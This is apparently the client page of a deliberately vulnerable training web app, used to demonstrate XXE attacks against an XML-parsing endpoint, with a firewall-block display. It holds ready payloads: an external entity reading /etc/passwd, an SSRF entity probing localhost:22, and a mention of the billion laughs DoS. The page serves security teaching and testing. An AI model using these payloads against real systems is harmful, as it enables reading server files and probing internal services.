'use client'

import { useState } from 'react'

export default function XXEPage() {
  const [xml, setXml] = useState(`<?xml version="1.0"?>
<user>
  <name>John Doe</name>
  <email>john@example.com</email>
</user>`)
  const [result, setResult] = useState<any>(null)
  const [loading, setLoading] = useState(false)

  const testXXE = async () => {
    setLoading(true)
    try {
      const response = await fetch('/api/vulnerable/xxe', {
        method: 'POST',
        headers: { 'Content-Type': 'application/xml' },
        body: xml
      })
      const data = await response.json()
      setResult(data)
    } catch (error: any) {
      setResult({ error: error.message })
    } finally {
      setLoading(false)
    }
  }

  const loadXXEPayload = () => {
    setXml(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>`)
  }

  return (
    <div className="container">
      <h1>XXE (XML External Entity) Vulnerability</h1>
      
      <div className="info-box">
        <strong>Test XXE Attacks:</strong>
        <ul style={{ marginTop: '10px', marginLeft: '20px' }}>
          <li>File read: <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></li>
          <li>SSRF: <code>&lt;!ENTITY xxe SYSTEM "http://localhost:22"&gt;</code></li>
          <li>DoS: Billion laughs attack</li>
        </ul>
      </div>

      <div className="form-group">
        <label>XML Data (Vulnerable to XXE):</label>
        <textarea
          value={xml}
          onChange={(e) => setXml(e.target.value)}
          rows={10}
          style={{ fontFamily: 'monospace' }}
        />
      </div>

      <button onClick={testXXE} disabled={loading}>
        {loading ? 'Parsing...' : 'Parse XML'}
      </button>
      <button onClick={loadXXEPayload} style={{ marginLeft: '10px' }}>
        Load XXE Payload
      </button>

      {result && (
        <div className={`result ${result.error || result.blocked ? 'error' : 'success'}`}>
          <h3>Result:</h3>
          {result.blocked ? (
            <div style={{ 
              padding: '1.5rem', 
              background: 'linear-gradient(135deg, #fee 0%, #fdd 100%)', 
              border: '3px solid #f00', 
              borderRadius: '12px',
              fontSize: '1.2rem',
              textAlign: 'center',
              color: '#c00',
              boxShadow: '0 4px 6px rgba(255, 0, 0, 0.1)'
            }}>
              <div style={{ fontSize: '3rem', marginBottom: '0.5rem' }}>🚫</div>
              <strong style={{ fontSize: '1.3rem' }}>
                {result.message || 'Request blocked by firewall'}
              </strong>
            </div>
          ) : result.error ? (
            <div style={{ 
              padding: '1rem', 
              background: '#fee', 
              border: '1px solid #f00', 
              borderRadius: '8px',
              color: '#c00'
            }}>
              <strong>Error:</strong> {result.error}
            </div>
          ) : (
            <pre style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
              {JSON.stringify(result, null, 2)}
            </pre>
          )}
        </div>
      )}
    </div>
  )
}

